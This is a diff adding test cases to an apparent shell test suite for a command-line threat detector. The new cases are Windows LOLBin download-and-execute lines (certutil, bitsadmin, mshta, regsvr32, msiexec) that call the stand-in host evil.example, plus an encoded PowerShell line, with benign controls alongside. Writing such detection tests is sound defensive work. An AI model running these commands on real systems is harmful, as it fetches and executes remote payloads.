@@ -10427,6 +10427,17 @@ printf 'To: x@y.com\nSubject: hi\n' > "$XDIR99/benign.eml"
     || check "email: benign headers stay low" "0" "1"
 rm -rf "$XDIR99"
 
+# ── cycle-100: LOLBin download/exec command lines ──
+check_text_hit 'certutil -urlcache -split -f http://evil.example/p.exe o.exe' 'ISOLATE' "text: certutil download primitive flagged"
+check_text_hit 'bitsadmin /transfer j http://evil.example/x.dll c:\\x.dll' 'BLOCK' "text: bitsadmin transfer flagged"
+check_text_hit 'mshta http://evil.example/payload.hta' 'ISOLATE' "text: mshta remote HTA flagged"
+check_text_hit 'regsvr32 /s /i:http://evil.example/x.sct scrobj.dll' 'BLOCK' "text: Squiblydoo regsvr32 flagged"
+check_text_hit 'msiexec /q /i http://evil.example/x.msi' 'BLOCK' "text: remote MSI install flagged"
+check_text_hit 'powershell -enc SQBFAHgA' 'BLOCK' "text: powershell -enc payload flagged"
+check_text_hit 'certutil -encode file.bin out.b64' 'OK' "text: benign certutil encode clean"
+check_text_hit 'schtasks /create /tn backup /sc daily /tr app' 'OK' "text: benign schtasks clean"
+check_text_hit 'certutil -verifyctl fetch http://crl.example' 'OK' "text: benign certutil verifyctl clean"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
